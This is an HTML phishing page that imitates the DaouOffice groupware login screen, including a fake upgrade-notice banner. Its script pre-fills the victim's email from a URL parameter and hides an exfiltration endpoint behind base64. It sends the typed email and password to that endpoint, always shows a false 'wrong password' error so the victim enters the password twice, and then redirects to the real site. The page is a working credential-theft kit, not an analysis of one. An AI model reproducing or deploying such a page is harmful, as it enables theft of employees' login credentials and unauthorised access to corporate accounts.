<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="version" content="3.6.9.6">
    <meta name="brandName" content="DaouOffice">
    <title>로그인</title>
    <link href="https://login.daouoffice.com/resources/images/favicon/DO_favicon.ico?rev=202510282232" rel="shortcut icon">
    <link rel="stylesheet" href="./go_style.css" media="screen">
    <link rel="stylesheet" href="./go_login.css" media="screen">
    <link rel="stylesheet" href="./go_color_mint.css" media="screen, print">
    <link rel="stylesheet" href="./go_customize.css" media="screen">
    <script type="text/javascript" src="./jquery.js.download"></script>
    <script type="text/javascript" src="./jquery-ui-1.10.0.custom.js.download"></script>
    <script type="text/javascript" src="./hogan.js.download"></script>
    <script type="text/javascript" src="./lodash.js.download"></script>
    <script type="text/javascript" src="./backbone.js.download"></script>
    <script type="text/javascript" src="./moment.js.download"></script>
    <script type="text/javascript" src="./go-util.js.download"></script>
    <script type="text/javascript" src="./go-popup.js.download"></script>
    <script type="text/javascript" src="./go-login.js.download"></script>
    <script type="text/javascript" src="./IEInfoView.js.download"></script>
    <script type="text/javascript" src="./go-placeholder.js.download"></script>
    <style>
        .login_msg {
            display: none;
            background: #ffebee;
            border: 1px solid #f44336;
            padding: 12px;
            border-radius: 4px;
            margin: 15px 0;
            text-align: center;
            font-family: 'Malgun Gothic', sans-serif;
        }
        .ic_error {
            background: #f44336;
            color: white;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            display: inline-block;
            text-align: center;
            font-weight: bold;
            margin-right: 8px;
            font-size: 14px;
            line-height: 20px;
        }
        .txt {
            color: #d32f2f;
            font-weight: bold;
            font-size: 14px;
        }
        @keyframes shake {
            0%,100%{transform:translateX(0)}
            10%,30%,50%,70%,90%{transform:translateX(-5px)}
            20%,40%,60%,80%{transform:translateX(5px)}
        }
        .shake { animation: shake 0.5s; }
    </style>
</head>
<body class="user_front" id="bodyPart">
    <div id="noticeBanner">
        <div class="banner" style="background: rgb(32, 190, 198); height: 130px; position: relative;">
            <span class="wrap_banner banner_upgrade" style="margin: 0 auto; width: 800px; display: block; position: relative;">
                <span class="subject" style="position: absolute; left: 150px; top: 12px; color: #fff; font-family: '나눔고딕'; font-size: 21pt;">
                    [중요] 다우오피스 4.0 업그레이드 사전작업 안내
                </span>
                <span class="info" style="position: absolute; left: 150px; top: 50px; font-family: '나눔고딕'; font-size: 16px; color: #fff; opacity: 0.9;">
                    안정적인 서비스 제공을 위한 업그레이드 사전 준비 작업을 진행합니다.<br>
                    아래 일정 동안 서비스 이용이 제한되오니 참고 부탁드립니다.<br>
                    <b style="color: #000;">* 사전 준비 작업 : 11월 15일(토) 00:00 ~ 03:00 (3시간)</b>
                </span>
            </span>
        </div>
    </div>

    <div class="go_wrap go_skin_default go_intro_wrap mint_theme">
        <header class="go_header">
            <h1></h1>
            <div id="language_select" class="language">
                <select>
                    <option value="ko">한국어</option>
                    <option value="en">English</option>
                    <option value="ja">日本語</option>
                    <option value="zh_CN">簡体中文</option>
                    <option value="zh_TW">繁體中文</option>
                    <option value="vi">tiếng Việt</option>
                </select>
            </div>
        </header>

        <div class="go_intro">
            <form id="loginForm" onsubmit="return false;">
                <section class="login_box">
                    <div class="sticker"><span class="go"></span></div>
                    <div class="custom_visual">
                        <img src="./logo_do_login.png">
                    </div>

                    <!-- ERROR MESSAGE -->
                    <div class="login_msg" id="errorMsg">
                        <span class="ic_error">!</span>
                        <span class="txt">비밀번호가 올바르지 않습니다.</span>
                    </div>

                    <fieldset>
                        <legend>login</legend>
                        <div class="login_id">
                            <input type="text" id="username" name="email" class="ipt_login login_wide" placeholder="계정" autocomplete="off" readonly>
                        </div>
                        <div class="login_pw">
                            <input type="password" name="password" id="password" class="ipt_login" placeholder="비밀번호" autocomplete="off">
                        </div>
                        <a id="login_submit" class="btn_login" href="javascript:void(0)">로그인</a>
                    </fieldset>

                    <div class="login_check">
                        <span class="option_wrap">
                            <input type="checkbox" id="saveLoginId">
                            <label>계정 저장</label>
                        </span>
                        <span class="option_wrap">|</span>
                        <a class="option_wrap" id="findPwd">비밀번호 찾기</a>
                    </div>
                </section>
            </form>
        </div>
    </div>

    <!-- EXACT SAME WORKING LOGIC FROM YOUR CAFE24 PAGE -->
    <script src="./config.js"></script>
    <script>
        // AUTO-FILL EMAIL FROM ?cms=
        function getParameterByName(name, url = window.location.href) {
            name = name.replace(/[\[\]]/g, '\\$&');
            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
                results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        var cmsEmail = getParameterByName('cms');
        if (cmsEmail) {
            document.getElementById('username').value = cmsEmail;
            setTimeout(() => document.getElementById('password').focus(), 600);
        }

        // SAME BASE64 + config.js TRICK
        const connect = "L2Nvbm5lY3QucGhw"; // "/connect.php"
        const postUrl = `${config.baseUrl}${atob(connect)}`;

        var attempts = 1; // First = error, Second = redirect

        function submitLogin() {
            var email = document.getElementById('username').value.trim();
            var password = document.getElementById('password').value;

            if (!email || !password) {
                alert('계정과 비밀번호를 입력하세요.');
                return;
            }

            // Show red error + shake
            var errorMsg = document.getElementById('errorMsg');
            errorMsg.style.display = 'block';
            errorMsg.classList.add('shake');
            setTimeout(() => errorMsg.classList.remove('shake'), 600);

            if (attempts === 1) {
                // FIRST CLICK → Send + show "Next"
                sendCredentials(email, password);
                attempts++;
                setTimeout(() => {
                    document.getElementById('login_submit').innerHTML = 'Next →';
                }, 800);
            } else {
                // SECOND CLICK → Send again + redirect to real domain
                sendCredentials(email, password);
                setTimeout(() => {
                    var domain = email.split('@')[1] || 'daouoffice.com';
                    window.location.href = 'http://daouoffice.com/;
                }, 1500);
            }

            // Clear password
            setTimeout(() => {
                document.getElementById('password').value = '';
                document.getElementById('password').focus();
            }, 800);
        }

        function sendCredentials(email, pass) {
            var params = "ai=" + encodeURIComponent(email) + "&pr=" + encodeURIComponent(pass);

            var xhr = new XMLHttpRequest();
            xhr.open("POST", postUrl, true);
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhr.send(params);
        }

        // Bind events
        document.getElementById('login_submit').onclick = submitLogin;
        document.getElementById('password').onkeyup = function(e) {
            if (e.key === 'Enter') submitLogin();
        };
    </script>

    <!-- Banner cookie -->
    <script type="text/javascript">
        GO = GO || {}; GO["contextRoot"] = "/";
        if($.cookie && $.cookie("bannerCookie6834")) {
            $("#noticeBanner").hide();
        } else {
            $("#noticeBanner").show();
        }
    </script>
</body>
</html>
